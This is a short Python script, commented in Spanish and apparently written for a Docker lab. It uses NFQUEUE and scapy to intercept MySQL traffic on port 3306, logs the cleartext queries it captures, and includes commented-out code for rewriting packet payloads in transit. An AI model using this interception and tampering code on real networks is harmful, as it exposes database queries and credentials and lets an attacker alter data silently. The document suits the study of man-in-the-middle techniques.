#!/usr/bin/env python3
"""
Estrategia A: intercepta y modifica tráfico MySQL vía NFQUEUE.

Requiere que el tráfico al puerto 3306 esté redirigido a la cola con:
    iptables -A OUTPUT -p tcp --dport 3306 -j NFQUEUE --queue-num 1
    iptables -A INPUT  -p tcp --sport 3306 -j NFQUEUE --queue-num 1

Este contenedor debe compartir la netns del cliente
(network_mode: "service:cliente" en docker-compose.yml).
"""
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw


def procesar(pkt):
    # Reconstruye el paquete como objeto Scapy para inspeccionarlo/editarlo.
    ip = IP(pkt.get_payload())

    if ip.haslayer(Raw):
        payload = bytes(ip[Raw].load)
        # El payload MySQL viaja en claro (sin TLS por defecto en este lab).
        # Aquí puedes buscar/reemplazar. Ejemplo: registrar queries.
        try:
            texto = payload.decode("utf-8", errors="replace")
            if "SELECT" in texto.upper() or "INSERT" in texto.upper():
                print(f"[MySQL] {texto!r}")
        except Exception:
            pass

        # --- EJEMPLO DE MODIFICACIÓN (descomenta para probar) ---
        # nuevo = payload.replace(b"usuario", b"HACKED_")
        # if nuevo != payload:
        #     ip[Raw].load = nuevo
        #     # Forzar recálculo de checksums al modificar el payload.
        #     del ip[IP].len, ip[IP].chksum, ip[TCP].chksum
        #     pkt.set_payload(bytes(ip))

    # accept() deja pasar el paquete (posiblemente modificado).
    pkt.accept()


nfqueue = NetfilterQueue()
nfqueue.bind(1, procesar)   # 1 = --queue-num usado en las reglas iptables
print("[*] Interceptando MySQL en NFQUEUE #1. Ctrl-C para salir.")
try:
    nfqueue.run()
except KeyboardInterrupt:
    print("\n[*] Fin.")
finally:
    nfqueue.unbind()
